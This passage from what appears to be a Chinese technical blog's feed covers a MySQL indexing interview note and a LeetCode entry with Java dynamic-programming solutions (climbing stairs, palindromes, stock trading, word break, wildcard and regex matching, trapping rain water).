<p>通过采样统计,由于统计的失误，导致系统没有走索引，而是走了全表扫描，而这，也是导致我们 SQL 语句执行的很慢的原因。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> <span class="number">100</span> <span class="operator">&lt;</span> c <span class="keyword">and</span> c <span class="operator">&lt;</span> <span class="number">100000</span>;</span><br></pre></td></tr></table></figure>



<h2 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h2><ol>
<li>SQL 查询语句：<code>SELECT * FROM A JOIN B ON A.id = B.id</code>，执行过程性能差，原因可能是什么？</li>
<li>上述 SQL 语句的执行过程是什么？哪里需要建立索引？</li>
<li>在 A.id 还是 B.id 上建立索引呢？</li>
</ol>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode</title>
    <url>/2021/12/21/%E9%9D%A2%E8%AF%95/LeetCode/</url>
    <content><![CDATA[<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><h3 id="70-爬楼梯-x2F-x2F-x2F"><a href="#70-爬楼梯-x2F-x2F-x2F" class="headerlink" title="70. 爬楼梯&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/climbing-stairs/">70. 爬楼梯</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="comment">// 最后一步可能跨了一级台阶，也可能跨了两级台阶，所以可以列出如下式子:f(x)=f(x−1)+f(x−2)</span></span><br><span class="line"><span class="comment">// 使用滚动数组思想</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">0</span>, q = <span class="number">0</span>, r = <span class="number">1</span>; <span class="comment">// p和q初始化为0, r表示f(0)=1</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      p = q;</span><br><span class="line">      q = r;</span><br><span class="line">      r = p + q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-最长回文子串-x2F-x2F-x2F"><a href="#5-最长回文子串-x2F-x2F-x2F" class="headerlink" title="5. 最长回文子串&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">5. 最长回文子串</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//频繁使用s.charAt(i)的话时间会更长,可以转化为charArray</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len][len];</span><br><span class="line">        <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            dp[i][i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLen</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; j ; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (charArray[i] == charArray[j]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j - i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dp[i + <span class="number">1</span>][j - <span class="number">1</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">                            dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; maxLen) &#123;</span><br><span class="line">                    start = i;</span><br><span class="line">                    maxLen = j - i + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, start + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="53-最大子序和-x2F-x2F"><a href="#53-最大子序和-x2F-x2F" class="headerlink" title="53. 最大子序和&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/maximum-subarray/">53. 最大子序和</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxSum</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                sum = sum + nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sum = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            maxSum = Math.max(sum, maxSum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="121-买卖股票的最佳时机-x2F-x2F-x2F-x2F"><a href="#121-买卖股票的最佳时机-x2F-x2F-x2F-x2F" class="headerlink" title="121. 买卖股票的最佳时机&#x2F;&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a>&#x2F;&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//时刻更新start位置</span></span><br><span class="line"><span class="comment">//动态规划 前i天的最大收益 = max&#123;前i-1天的最大收益，第i天的价格-前i-1天中的最小价格&#125;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; min) &#123;</span><br><span class="line">                min = prices[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max = Math.max(max, prices[i] - min);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="122-买卖股票的最佳时机-II"><a href="#122-买卖股票的最佳时机-II" class="headerlink" title="122. 买卖股票的最佳时机 II"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii">122. 买卖股票的最佳时机 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只要第二天比第一天大就买, </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &gt; prices[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                res += prices[i] - prices[i-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="62-不同路径-x2F-x2F-x2F"><a href="#62-不同路径-x2F-x2F-x2F" class="headerlink" title="62. 不同路径&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/unique-paths/">62. 不同路径</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i][j] = dp[i][j - <span class="number">1</span>] + dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 排列组合</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// 只跟第几行第几列有关,从m + n - 2步中抽出m - 1步</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Math.min(m - <span class="number">1</span>, n - <span class="number">1</span>); i++) &#123;</span><br><span class="line">      ans *= m + n - <span class="number">2</span> - i;</span><br><span class="line">      ans /= i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="139-单词拆分-x2F"><a href="#139-单词拆分-x2F" class="headerlink" title="139. 单词拆分&#x2F;"></a><a href="https://leetcode-cn.com/problems/word-break/">139. 单词拆分</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="comment">// dp</span></span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[s.length() + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 初始化0值</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 用一个set来存单词列表</span></span><br><span class="line">        Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordDict);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 然后遍历</span></span><br><span class="line">        <span class="comment">// dp[i]表示字符串s的前i个字符能否拆分成wordDict</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; s.length() + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[j] &amp;&amp; wordSet.contains(s.substring(j , i))) &#123;</span><br><span class="line">                    dp[i] = <span class="literal">true</span>;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s.length()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="140-单词拆分-II-x2F-x2F"><a href="#140-单词拆分-II-x2F-x2F" class="headerlink" title="140. 单词拆分 II&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/word-break-ii/">140. 单词拆分 II</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划 + 回溯</span></span><br><span class="line"><span class="comment">// 先用动态规划判断是否有解,然后再用回溯输出所有解</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        HashSet&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>(wordDict);</span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; len + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[j] &amp;&amp; wordSet.contains(s.substring(j,i))) &#123;</span><br><span class="line">                    dp[i] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span> (dp[len]) &#123;</span><br><span class="line">            Deque&lt;String&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>();</span><br><span class="line">            dfs(res, <span class="number">0</span>,len, s, wordSet, path, dp);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(List&lt;String&gt; res, <span class="type">int</span> start, <span class="type">int</span> len, String s, HashSet&lt;String&gt; wordSet, Deque&lt;String&gt; path, <span class="type">boolean</span>[] dp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == len) &#123;</span><br><span class="line">            res.add(String.join(<span class="string">&quot; &quot;</span>, path));</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> s.substring(start,i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (wordSet.contains(prefix)) &#123;</span><br><span class="line">                path.addLast(prefix);</span><br><span class="line">                dfs(res, i + <span class="number">1</span> ,len, s, wordSet, path, dp);</span><br><span class="line">                path.removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="44-通配符匹配-x2F-x2F"><a href="#44-通配符匹配-x2F-x2F" class="headerlink" title="44. 通配符匹配&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/wildcard-matching/">44. 通配符匹配</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] pc = p.toCharArray();</span><br><span class="line"></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j] | dp[i - <span class="number">1</span>][j - <span class="number">1</span>] || dp[i][j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-19-正则表达式匹配"><a href="#剑指-Offer-19-正则表达式匹配" class="headerlink" title="剑指 Offer 19. 正则表达式匹配"></a><a href="https://leetcode-cn.com/problems/zheng-ze-biao-da-shi-pi-pei-lcof/">剑指 Offer 19. 正则表达式匹配</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] pc = p.toCharArray();</span><br><span class="line"></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (pc.length &gt; <span class="number">1</span> &amp;&amp; pc[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">            dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pc.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; pc.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] |= dp[i - <span class="number">1</span>][j];</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                        dp[i][j] = dp[i - <span class="number">2</span>][j] | dp[i][j];</span><br><span class="line">                        <span class="keyword">if</span> (pc[i - <span class="number">2</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">2</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                            dp[i][j] |= dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                            dp[i][j] |= dp[i][j - <span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="42-接雨水-x2F-x2F"><a href="#42-接雨水-x2F-x2F" class="headerlink" title="42. 接雨水&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/trapping-rain-water/">42. 接雨水</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态规划,首先用两个数组，max_left [i]代表第 i 列左边最高的墙的高度，max_right[i] 代表第 i 列右边最高的墙的高度。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span>[] maxL = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span>[] maxR = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            maxL[i] = Math.max(maxL[i - <span class="number">1</span>], height[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxR[i] = Math.max(maxR[i + <span class="number">1</span>], height[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (height[i] &gt;= maxL[i] || height[i] &gt;= maxR[i]) <span class="keyword">continue</span>;</span><br><span class="line">            res = res + Math.min(maxL[i],maxR[i]) - height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[height.length];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height.length; i++) &#123;</span><br><span class="line">            dp[i] = Math.max(dp[i - <span class="number">1</span>], height[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> height.length - <span class="number">2</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            max = Math.max(max, height[i + <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (height[i] &gt;= max || height[i] &gt;= dp[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += Math.min(max, dp[i]) - height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 